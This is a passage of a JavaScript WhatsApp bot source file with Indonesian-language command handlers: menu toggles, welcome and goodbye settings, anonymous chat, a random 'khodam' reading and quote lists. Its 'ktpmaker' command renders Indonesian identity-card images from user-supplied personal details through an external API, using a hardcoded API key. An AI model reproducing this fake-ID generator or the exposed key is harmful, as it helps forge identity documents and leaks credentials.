        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/yoimiyachat.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
}
  
}
break
//=========================================\\=====
case 'cekkhodam':
  if (!text) return replyviex('Nama nya mana yang mau di cek khodam nya');
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }
  const ceknyaa = pickRandom(['Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang']);
  const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
  const khodam = `khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;
  TradzSigma.sendMessage(m.chat, {audio: {url: `https://api.siputzx.my.id/api/tools/ttsgoogle?text=${khodam}`}, mimetype: 'audio/mpeg', ptt: true }, {quoted: m});

  break;
//=========================================\\======
case "welcome2": {
if (!m.isGroup) return replyviex('Fitur Khusus Group!')
if (!isAdmins && !TradID) return replyviex('Fitur Khusus admin!')
if (!text) return replyviex(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return replyviex("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
replyviex("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return replyviex("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
replyviex("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return replyviex(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case 'left': case 'goodbye':
if (!m.isGroup) return replyviex('Fitur Khusus Group!')
if (!isAdmins && !TradID) return replyviex('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return replyviex(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
replyviex('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return replyviex(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
replyviex('Sukses menonaktifkan goodbye di grup ini')
} else {
replyviex(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case 'onlygroup':
case 'onlygc':
    if (!TradID) return reply('Fitur khusus Owner!')
    if (!args[0]) return replyviex(`Contoh: ${prefix + command} on/off`)

    if (q.toLowerCase() === 'on') {
        if (db.settings[botNumber].onlypc) {
            return replyviex('Gagal mengaktifkan Only Group karena mode Only Private Chat sedang aktif.\nSilakan matikan Only-PC terlebih dahulu.')
        }
        db.settings[botNumber].onlygrub = true
        replyviex('Berhasil mengaktifkan mode Only Group. Bot hanya akan merespon di grup.')
    } else if (q.toLowerCase() === 'off') {
        db.settings[botNumber].onlygrub = false
        replyviex('Berhasil menonaktifkan mode Only Group. Bot akan merespon di semua chat.')
    } else {
        replyviex(`Opsi tidak dikenal. Gunakan: ${prefix + command} on/off`)
    }
    break

case 'onlyprivatechat':
case 'onlypc':
    if (!TradID) return reply('Fitur ini hanya untuk Owner!')
    if (!isPrivate) return reply('Perintah ini hanya bisa digunakan di private chat!')
    if (!args[0]) return replyviex(`Contoh: ${prefix + command} on/off`)

    if (q.toLowerCase() === 'on') {
        if (db.settings[botNumber].onlygrub) {
            return replyviex('Gagal mengaktifkan Only Private Chat karena mode Only Group sedang aktif.\nSilakan matikan Only-Group terlebih dahulu.')
        }
        db.settings[botNumber].onlypc = true
        replyviex('Berhasil mengaktifkan mode Only Private Chat. Bot tidak akan merespon di grup.')
    } else if (q.toLowerCase() === 'off') {
        db.settings[botNumber].onlypc = false
        replyviex('Berhasil menonaktifkan mode Only Private Chat. Bot akan merespon grup kembali.')
    } else {
        replyviex(`Pilihan tidak dikenal. Gunakan: ${prefix + command} on/off`)
    }
    break
//=========================================\\======

//=========================================\\======
case 'ktpmaker': {
if (args.length == 0) return reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc \n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let get_args = args.join(" ").split("|")
let nik = get_args[0]
if (!nik) return replyviex('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
let prov = get_args[1]
if (!prov) return replyviex('provinsi mana kak')
let kabu = get_args[2]
if (!kabu) return replyviex('kabupaten mana kak')
let name = get_args[3]
if (!name) return replyviex('nama nya siapa kak')
let ttl = get_args[4]
if (!ttl) return replyviex('tempat tanggal lahir nya kak')
let jk = get_args[5]
if (!jk) return replyviex('jenis kelamin pria atau wanita kak')
let jl = get_args[6]
if (!jl) return replyviex('alamat rumah nya mana kak')
let rtrw = get_args[7]
if (!rtrw) return replyviex('RT / RW berapa kak')
let lurah = get_args[8]
if (!lurah) return replyviex('kelurahan mana kak')
let camat = get_args[9]
if (!camat) return replyviex('kecamatan mana kak')
let agama = get_args[10]
if (!agama) return replyviex('agama nya apa kak')
let nikah = get_args[11]
if (!nikah) return replyviex('status belum ada')
let kerja = get_args[12]
if (!kerja) return replyviex('pekerjaan belum ada')
let warga = get_args[13]
if (!warga) return replyviex('region belum ada')
let until = get_args[14]
if (!until) return replyviex('waktu berlaku belum ada')
 TradzSigma.sendMessage(m.chat, { image: {url: `https://api.lolhuman.xyz/api/ktpmaker?apikey=efcb180d3fd3134748648887&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=https://telegra.ph/file/2487220c98c7c4fb6f438.jpg`}, caption: 'nih ktp nya cok' }, { quoted: m })
}
break 
//=========================================\\======
case 'report': {
replyviex(` =====[ *DEVELOPER OF DASZYA BOT* ]===== 
• ᴊᴀɴɢᴀɴ ᴄʜᴀᴛ ꜱᴇᴍʙᴀʀᴀɴɢᴀɴ ᴋᴇ ɴᴏᴍᴏʀ ᴏᴡɴᴇʀ ᴍᴀᴋᴀ ᴀᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ ᴅɪ ʙʟᴏᴋɪʀ
• ᴊᴀɴɢᴀɴ ᴄᴀʟʟ/ᴛᴇʟᴇᴘᴏɴ ᴏᴡɴᴇʀ ᴛᴀɴᴘᴀ ɪᴢɪɴ • ᴄʜᴀᴛ ʟᴀɴɢꜱᴜɴɢ ᴋᴇ ɪɴᴛɪɴʏᴀ ᴀᴊᴀ , 
• https://wa.me/6283182739135?text=Lapor+min+fitur+ada+yang+eror+kalo+bisa+di+perbaiki.
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕",`)
}
break
//=========================================\\======
case 'sendprofile': case 'sendprofil':
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await TradzSigma.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await TradzSigma.sendContact(partnerJID, [m.sender.split("@")[0]])
TradzSigma.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
TradzSigma.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
//=========================================\\======
case 'mulai': case 'start': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
TradzSigma.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await TradzSigma.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
TradzSigma.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
//=========================================\\======
case 'quotesanime':
case 'quotesanim': {
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
//=========================================\\======
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const DinzIDtruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${DinzIDtruth}`)
}
break

//=========================================\\======
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
